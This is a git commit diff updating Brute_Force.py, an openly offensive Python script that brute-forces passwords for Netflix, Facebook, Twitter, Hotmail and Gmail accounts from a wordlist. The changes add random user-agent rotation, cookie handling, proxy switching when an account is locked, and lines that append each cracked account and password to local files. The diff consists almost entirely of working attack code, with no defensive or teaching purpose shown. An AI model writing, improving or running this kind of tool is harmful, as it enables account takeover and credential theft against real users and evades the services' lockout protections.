4f14d459f87eca3dc4bac6da416914724360db4f
Matrix <33636578+Matrix07ksa@users.noreply.github.com>
2019-07-23 02:34:31 +0300

    Update Brute_Force.py

--- Brute_Force.py
+++ Brute_Force.py
@@ -1,14 +1,30 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
 import smtplib
 import threading
 from optparse import *
 import time
-from proxylist import ProxyList
-from mechanize import Browser
+try :
+    from proxylist import ProxyList
+except:
+    print("pip3 install proxylist ")
+try :
+    from mechanize import Browser
+except:
+    print("pip3 install mechanize")
 from os import *
 import sys
 import logging
 import io
+import random
+try:
+    import cookielib
+except:
+    print("pip3 install cookielib")
+try:
+    import mechanize
+except:
+    print("pip3 install mechanize ")
 R = '\033[31m'  # red
 G = '\033[32m'  # green
 W = '\033[0m' # white (normal)
@@ -54,10 +70,16 @@ use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
 (options,args) = use.parse_args()
 
 brows = Browser()
-
 brows.set_handle_robots(False)
 brows._factory.is_html = True
-brows.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)')]
+brows.set_cookiejar(cookielib.LWPCookieJar())
+useragents = [
+           'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
+           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
+           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
+           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6']
+brows.addheaders = [('User-agent',random.choice(useragents))]
+brows.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 proxyList = options.proxy
 def proxy():
     logging.basicConfig()
@@ -70,7 +92,7 @@ def proxy():
     getProxy = pl.random().address()
     brows.set_proxies(proxies={"https": getProxy})
     try:
-        checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=2)
+        checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=10)
     except:
         return proxy()
 
@@ -95,8 +117,10 @@ def Netflix():
             brows.form['password'] = password
             brows.method = "POST"
             submit = brows.submit()
+            
             if 'https://www.netflix.com/browse' in  submit.geturl():
                 print("{}[True][+] Password Found [{}][+]".format(G,password))
+                Save = io.open("Netflix.txt","a").write("Account Netflix:"+options.netflix+"\t\tPassword:"+password+"\n")
                 break
             else :
                 print("%s[!] False Login Password%s\n"%(R,W))
@@ -129,6 +153,7 @@ def facebook():
             submit = brows.submit()
             if 'https://www.facebook.com/?sk=welcome' in  submit.geturl():
                 print("{}[True][+] Password Found [{}][+]".format(G,password))
+                Save = io.open("Facebook.txt","a").write("Account Facebook:"+options.facebook+"\t\tPassword:"+password+"\n")
                 break
             else :
                 print("%s[!] False Login Password%s\n"%(R,W))
@@ -159,11 +184,17 @@ def twitter():
             brows.form['session[password]'] = password
             brows.method = "POST"
             submit = brows.submit()
-            if submit.geturl() == "https://mobile.twitter.com/home":
+            if submit.geturl() == "https://mobile.twitter.com/":
                 print("{}[True][+] Password Found [{}][+]".format(G,password))
+                Save = io.open("Twitter.txt","a").write("Account Twitter:"+options.twitter+"\t\tPassword:"+password+"\n")
+                break
+            elif submit.geturl() == "https://mobile.twitter.com/home":
+                print("{}[True][+] Password Found [{}][+]".format(G,password))
+                Save = io.open("Twitter.txt","a").write("Account Twitter:"+options.twitter+"\t\tPassword:"+password+"\n")
                 break
             elif 'https://mobile.twitter.com/account/login_challenge' in submit.geturl():
                     print("{}[True][+] Password Found [{}][+]".format(G,password))
+                    Save = io.open("Twitter.txt","a").write("Account Twitter:"+options.twitter+"\t\tPassword:"+password+"\n")
                     break
             elif 'https://mobile.twitter.com/account/locked' in submit.geturl():
                 proxy()
@@ -189,6 +220,7 @@ if options.gmail == None  :
             try :
                 smtp_srverH.login(options.hotmail,options.password)
                 print("Found Password :{} \t Found Hotmail:{}".format(options.password,options.hotmail))
+                Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+options.password+"\n")
             except :
                 print("Not Found Password : {} \t Email Hotmail:{}".format(options.password,options.hotmail))
         elif options.list_password !=None or options.password == None :
@@ -198,19 +230,18 @@ if options.gmail == None  :
                     print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
                     smtp_srverH.login(options.hotmail,password)
                     print("FOUND Password :{} \n Found Hotmail:{}".format(password,options.hotmail))
+                    Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+password+"\n")
                 except smtplib.SMTPAuthenticationError:
                     print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
     if options.twitter != None :
         hejab = threading.Thread(target=twitter,name="hejab")
-        hejab.run()
+        hejab.start()
     if options.facebook != None :
         facebook = threading.Thread(target=facebook,name="facebook")
-        facebook.run()
+        facebook.start()
     if options.netflix != None:
         netflix = threading.Thread(target=Netflix,name="Netflix")
         netflix.start()
-
-
     
 
 elif options.gmail !=None or  options.hotmail== None or options.twitter==None:  
@@ -222,6 +253,7 @@ elif options.gmail !=None or  options.hotmail== None or options.twitter==None:
         try :    
             smtp_srverG.login(options.gmail,options.password)
             print("Found Password :{} \t Found Gmail:{}".format(options.password,options.gmail))
+            Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+options.password+"\n")
         except :
             print("Not Found Password : {} \t Email Gmail:{}".format(options.password,options.gmail))
     elif options.list_password !=None:
@@ -232,6 +264,7 @@ elif options.gmail !=None or  options.hotmail== None or options.twitter==None:
             try :    
                 smtp_srverG.login(options.gmail,password)
                 print("{}<<<+++Found Password :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
+                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+password+"\n")
                 break
             except smtplib.SMTPAuthenticationError:
                 print("{}<<<---Not Found Password : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       
